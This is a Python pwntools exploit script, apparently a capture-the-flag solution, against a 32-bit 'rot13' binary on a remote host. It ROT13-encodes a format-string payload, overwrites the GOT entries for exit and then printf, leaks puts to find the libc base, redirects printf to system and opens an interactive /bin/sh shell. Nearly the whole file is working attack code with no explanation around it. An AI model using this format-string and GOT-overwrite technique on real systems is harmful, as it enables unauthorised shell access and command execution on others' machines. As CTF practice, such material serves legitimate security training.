#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import string

exe = context.binary = ELF('./rot13')
libc = ELF('libc6-i386_2.35-0ubuntu3_amd64.so')

host = args.HOST or '10.22.6.20'
port = int(args.PORT or 1338)

rot13 = str.maketrans(
    'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
    'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')

def rot(msg):
    o = b''
    for i in msg:
        if chr(i) in string.ascii_lowercase or chr(i) in string.ascii_uppercase:
            a = chr(i).translate(rot13).encode()
        else:
            a = p8(i)
        o += a
    return o

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+204
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Leak libc
p = fmtstr_payload(11, {(exe.got['exit']): exe.sym['main']})
p += b'AAAA'
p += p32(exe.got['puts'])
p += b'%24$s'
print(len(rot(p)))
io.sendlineafter(b'input: \n',rot(p))
io.recvuntil(b'AAAA')
io.recv(4)
leak = u32(io.recv(4))
libc.address = leak - libc.sym['puts']

print(f'{leak = :x} {libc.address = :x}')

# Exploit
fmt = fmtstr_payload(11, {exe.got['printf']: exe.sym['system']})
io.sendline(rot(fmt))


io.sendline(rot(b'/bin/sh'))

io.interactive()

